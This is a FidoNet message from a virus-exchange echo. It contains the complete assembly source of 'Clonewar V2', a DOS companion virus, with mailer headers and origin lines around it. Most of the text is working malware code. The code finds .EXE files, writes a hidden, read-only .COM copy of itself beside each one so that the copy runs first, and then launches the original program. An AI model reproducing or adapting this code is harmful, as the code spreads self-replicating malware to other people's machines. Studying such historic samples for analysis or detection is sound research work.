;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 25 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : CLONWAR2.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Fred Lee, 2:283/718 (06 Nov 94 16:47)
;* To   : Bryan Sullivan
;* Subj : CLONWAR2.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
;Clonewar V2.0
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³  Assembly Source Listing for Clonewar V2 Companion Virus                  ³
;³  Copyright (c) 1993  All Rights Reserved. :)                              ³
;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³ The Clonewar is a direct action companion virus. This version is simply   ³
;³ a partial code optimization of the original....                           ³
;³                                                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

CSEG            SEGMENT
                ASSUME  CS:CSEG,DS:NOTHING

                ORG   100H

START:
                jmp  VIR_BEGIN         ;lets get moving...


;               db  "[CloneWar2]"      ;i really hate the waste...
WILDCARD        DB  "*.EXE",0
FILE_EXT        DB  "COM",0
FILE_FOUND      DB  12 DUP(' '), 0
FILE_CREATE     DB  12 DUP(' '), 0
SEARCH_ATTRIB   DW  17H
NUM_INFECT      DW  0


My_Cmd:
CMD_LEN         DB  13
FILE_CLONE      DB  12 DUP (' '), 0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Read all the directory filenames and store as records in buffer.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Vir_begin:

           mov    sp,offset STACK_HERE   ;move stack down
           mov    bx,sp
           add    bx,15
           mov    cl,4
           shr    bx,cl
               mov    ah,4ah                 ;deallocate rest of memory
           int    21h

           mov    di,OFFSET FILE_CLONE   ;Point to buffer.
           mov    si,OFFSET FILE_FOUND
           mov    cx,12
           rep    movsb

Read_dir:      mov    dx,OFFSET WILDCARD     ;file mask for directory search
           mov    cx,SEARCH_ATTRIB

               mov    ah,4Eh                 ;find first matching file
           int    21h

               jc     EXIT                   ;If empty directory, exit

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Store_name:

           mov    di,OFFSET FILE_FOUND   ;Point to buffer.
           mov    si,158                 ;stow the file found in buffer
           mov    cx,12
           rep movsb

           mov    di,OFFSET FILE_CREATE  ;Point to buffer.
           mov    si,158
           mov    cx,12
           rep movsb

           cld
           mov    di,OFFSET FILE_CREATE
           mov    al,'.'
           mov    cx,9
           repne scasb                   ;find the '.'

           mov    si,OFFSET FILE_EXT
           mov    cx,3
           rep movsb                     ;replace the .EXE with .COM
                         ;from buffer

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Check_file:                                  ;does the file exist?
           mov    dx,OFFSET FILE_CREATE
               xor    cx,cx
               mov    ax,3d00h               ;Open file, read only
           int    21h
               jnc    find_next

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Infect_file:                                 ;create companion routine

               mov    dx,OFFSET FILE_CREATE  ;contains name of "companion"
               xor    cx,cx
               mov    ah,3ch                 ;construct file
           int    21h
           jc     EXIT

                                             ;Write virus to companion file
               xchg   bx,ax
               mov    cx,(OFFSET END_OF_CODE - OFFSET START)  ;virus length
           mov    dx,OFFSET START
               mov    ah,40h                 ;write to file function
               int    21h                    ;do it

                                             ;Close file
               mov    ah,3eh                 ;assumes bx still has file handle
           int    21h

                                             ;Change attributes
               mov    dx,OFFSET FILE_CREATE  ;of created file to
               mov    cx,3                   ;(1) read only and (2) hidden
           mov    ax,4301h
           int    21h
               jmp    prepare_command

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;...findnext...
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
find_next:
              mov     ah, 4fh                ;find next...
              int     21h
              jmp     store_name
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Prepare_command:

           cld
           mov    di,OFFSET FILE_CLONE
           mov    al,0
           mov    cx,12
               repne scasb                   ;find the end of string \0

               mov    al,0Dh                 ;<CR>
               stosb                         ;replace \0 with a <CR>

               mov    ax,12                  ;store length of the command
           sub    ax,cx
           mov    CMD_LEN, al

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Exit:
                                             ;Run the original program
           mov    si, OFFSET MY_CMD
               int    2Eh                    ;Pass command to command
                                             ;interpreter for execution
               mov    ax,4C00H               ;Exit to DOS
           int    21h


END_OF_CODE     =       $

STACK_HERE      EQU   END_OF_CODE + 512

CSEG            ENDS
                END      START

;-+-  FidoPCB v1.4 [NR]
; + Origin: Fred's Place (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    ş The MeÂeO
;
;/L            Specify library search paths
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

